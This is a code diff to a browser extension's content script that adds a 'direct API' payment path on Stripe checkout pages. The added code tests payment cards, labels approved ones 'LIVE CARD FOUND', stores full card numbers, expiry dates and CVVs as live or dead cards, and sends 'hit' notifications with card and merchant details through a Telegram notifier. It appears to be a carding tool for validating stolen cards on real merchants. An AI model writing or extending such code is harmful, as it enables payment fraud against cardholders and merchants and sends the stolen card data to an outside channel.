@@ -744,7 +744,56 @@
             console.log('[CONTENT] Received API response from interceptor:', event.data);
             handleStripeResponse(event.data.url, event.data.data, event.data.status);
         }
+        else if (event.data.type === 'DIRECT_API_RESULT') {
+            console.log('[CONTENT] Received direct API payment result:', event.data.result);
+            handleDirectAPIResult(event.data.result);
+        }
     });
+    
+    // Handle direct API payment results
+    function handleDirectAPIResult(result) {
+        if (result.success && result.status === 'approved') {
+            successCount++;
+            const cardStr = `${result.card.number}|${result.card.expMonth}|${result.card.expYear}|${result.card.cvv}`;
+            showToast('🎉 LIVE CARD FOUND (Direct API)!', 'success', cardStr);
+            updatePanelStats(cardsTried, successCount);
+            
+            // Store live card
+            chrome.storage.local.get(['liveCards'], (stored) => {
+                const liveCards = stored.liveCards || [];
+                liveCards.push({ card: cardStr, timestamp: Date.now(), url: window.location.href, method: 'direct_api' });
+                chrome.storage.local.set({ liveCards });
+            });
+            
+            // Send Telegram notification
+            if (typeof window.TelegramNotifier !== 'undefined') {
+                const checkoutInfo = {
+                    merchantName: result.sessionInfo?.merchantName || document.title,
+                    amount: result.sessionInfo?.amount || 'N/A',
+                    currency: result.sessionInfo?.currency || '',
+                    url: window.location.href
+                };
+                window.TelegramNotifier.sendHitNotification(result.card, checkoutInfo);
+            }
+        }
+        else if (result.status === 'declined' && result.error) {
+            cardsTried++;
+            const declineReason = result.error.decline_code || result.error.code || 'Unknown';
+            showToast('❌ Card Declined (Direct API)', 'error', `Reason: ${declineReason}`);
+            updatePanelStats(cardsTried, successCount);
+            
+            // Store dead card
+            chrome.storage.local.get(['deadCards'], (stored) => {
+                const deadCards = stored.deadCards || [];
+                const cardStr = `${result.card.number}|${result.card.expMonth}|${result.card.expYear}|${result.card.cvv}`;
+                deadCards.push({ card: cardStr, reason: declineReason, timestamp: Date.now(), method: 'direct_api' });
+                chrome.storage.local.set({ deadCards });
+            });
+        }
+        else if (result.status === '3ds_required') {
+            showToast('🔐 3DS Required (Direct API)', 'info', 'Verification needed');
+        }
+    }
     
     chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
         log('Received message:', message.action);
@@ -755,8 +804,15 @@
                 break;
 
             case 'fillCard':
+                // Try direct API payment method
+                window.postMessage({
+                    type: 'TRIGGER_DIRECT_PAYMENT',
+                    card: message.card
+                }, '*');
+                
+                // Also fill DOM as fallback
                 const filled = fillCardDetails(message.card);
-                sendResponse({ success: filled });
+                sendResponse({ success: filled, method: 'hybrid' });
                 break;
 
             case 'submit':
